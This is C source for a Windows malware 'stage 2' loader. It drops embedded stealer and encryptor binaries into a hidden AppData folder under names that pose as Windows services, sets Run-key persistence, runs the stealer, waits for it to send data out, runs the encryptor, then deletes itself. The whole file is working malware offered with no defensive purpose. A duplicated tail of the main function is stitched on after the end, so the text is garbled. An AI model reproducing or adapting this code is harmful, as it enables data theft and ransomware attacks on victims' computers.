// loader.c — stage 2
// Runs after dropper fetches it. Drops steal.exe + enc.exe to %APPDATA%,
// adds persistence, then self-deletes.

#include <windows.h>
#include <shlobj.h>
#include <stdio.h>

#include "steal_bytes.h"
#include "enc_bytes.h"

// xxd -i generates arrays named after the file. Rename via macros.
#define steal_bin steal_exe
#define enc_bin   enc_exe
#define STEAL_LEN steal_exe_len
#define ENC_LEN   enc_exe_len

// Get %APPDATA% path
int get_appdata(char* out, size_t out_len) {
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, out))) return 0;
    strncat(out, "\\Microsoft\\Windows\\Templates", out_len - strlen(out) - 1);
    return 1;
}

// Drop a binary
int drop_file(const char* path, const unsigned char* data, size_t len) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD written;
    WriteFile(h, data, (DWORD)len, &written, NULL);
    CloseHandle(h);
    return written == len;
}

// Persistence via HKCU Run key
void persist(const char* exe_path) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsTemplates", 0, REG_SZ,
                       (const BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);
        RegCloseKey(hKey);
    }
}

// Run and forget
void run(const char* path) {
    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (CreateProcessA(path, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Self-delete — spawn cmd to delete this exe after we exit
void self_delete() {
    char self[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);

    char cmd[MAX_PATH * 2];
    snprintf(cmd, sizeof(cmd), "cmd /c timeout /t 2 > nul & del /f /q \"%s\"", self);

    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    char dir[MAX_PATH] = {0};
    if (!get_appdata(dir, sizeof(dir))) return 1;

    CreateDirectoryA(dir, NULL);

    char steal_path[MAX_PATH], enc_path[MAX_PATH];
    snprintf(steal_path, sizeof(steal_path), "%s\\update_svc.exe", dir);
    snprintf(enc_path,   sizeof(enc_path),   "%s\\winlogon_svc.exe", dir);

    drop_file(steal_path, steal_bin, STEAL_LEN);
    drop_file(enc_path,   enc_bin,   ENC_LEN);

    persist(steal_path);

    // Run steal first, then encryption
    run(steal_path);
    Sleep(60000);  // give steal time to exfil
    run(enc_path);

    self_delete();
    return 0;
}    char steal_path[MAX_PATH], enc_path[MAX_PATH];
    snprintf(steal_path, sizeof(steal_path), "%s\\update_svc.exe", dir);
    snprintf(enc_path,   sizeof(enc_path),   "%s\\winlogon_svc.exe", dir);

    drop_file(steal_path, steal_bin, sizeof(steal_bin));
    drop_file(enc_path,   enc_bin,   sizeof(enc_bin));

    persist(steal_path);

    // Run steal first, then encryption
    run(steal_path);
    Sleep(60000);  // give steal time to exfil
    run(enc_path);

    self_delete();
    return 0;
}
